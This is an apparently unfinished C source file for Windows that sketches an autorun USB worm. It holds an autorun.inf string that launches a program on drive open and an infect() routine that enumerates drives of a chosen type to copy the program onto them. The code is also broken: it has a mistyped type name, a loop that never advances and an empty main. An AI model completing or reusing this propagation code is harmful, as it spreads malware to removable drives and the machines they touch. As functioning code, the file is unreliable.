#include <Windows.h>


char szAutoRun[] = "[AutoRun] \
\r\nopen=notepad.exe \
\r\nshell\\open=打开(&O) \
\r\nshell\\open\\Command=notepad.exe \
\r\nshell\\explore=资源管理器(&X) \
\r\nshell\\explore\\Command=notepad.exe \
\r\nshellexecute=notepad.exe \ 
\r\nshell\\Auto\\Command=notepad.exe";

void infect(char *pszFile, UNINT uDriveType)
{

	char szDriveString[MAXBYTE] = { 0 };
	DWORD dwRet = 0;
	DWORD iNum = 0;
	char szRoot[4]  = {0};
	UINT uType = 0;
	char szTarget[MAX_PATH] = { 0 };

	dwRet = GetLogicalDriveStrings(MAXBYTE, szDriveString);

	while (iNum < dwRet)
	{

		strncpy(szRoot, &szDriveString[iNum], 3);

		uType = GetDriveType(szRoot);

		if (uType == uDriveType)
		{

			//拷贝文件

			lstrcpy(szTarget, szRoot);




		}


	}
	
	
}


int main()
{

	//自身所在位置

	char szFileName[MAX_PATH] = {0};

	//保存当前



}
